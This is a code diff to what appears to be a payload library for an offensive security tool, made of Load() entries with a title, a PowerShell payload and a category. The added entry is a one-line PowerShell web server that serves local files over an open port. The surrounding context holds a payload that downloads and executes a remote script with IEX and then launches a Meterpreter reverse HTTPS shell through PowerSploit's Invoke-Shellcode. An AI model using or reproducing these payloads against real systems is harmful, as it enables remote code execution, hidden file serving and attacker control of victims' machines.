@@ -171,6 +171,13 @@ Load({
 	}
 })
 
+// Credit => http://obscuresecurity.blogspot.com/2014/05/dirty-powershell-webserver.html
+Load({
+	title: "Simple HTTP Server",
+	payload: 'Write-Host "Starting Web Server";$H = New-Object Net.HttpListener;$H.Prefixes.Add("http://+:<LPORT>/");$H.Start();While ($H.IsListening) { [console]::TreatControlCAsInput = $true;while ($true){if ([console]::KeyAvailable){Write-Host "Testing";$key = [system.console]::readkey($true);if (($key.modifiers -band [consolemodifiers]"control") -and ($key.key -eq "C")){Write-Host "Stopping Web Server";$H.Stop();break}}};$HC = $H.GetContext();$HR = $HC.Response;$HR.Headers.Add("Content-Type","text/plain");$Buf = [Text.Encoding]::UTF8.GetBytes((GC (Join-Path $Pwd ($HC.Request).RawUrl)));$HR.ContentLength64 = $Buf.Length;$HR.OutputStream.Write($Buf,0,$Buf.Length);$HR.Close();}$H.Stop();',
+	category: "Powershell"
+})
+
 Load({
 	title: "Remotely download and execute PowerSploit's Invoke-Shellcode",
 	payload: 'IEX (New-Object Net.WebClient).DownloadString("<PROMPT>");Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <LHOST> -Lport <LPORT>',
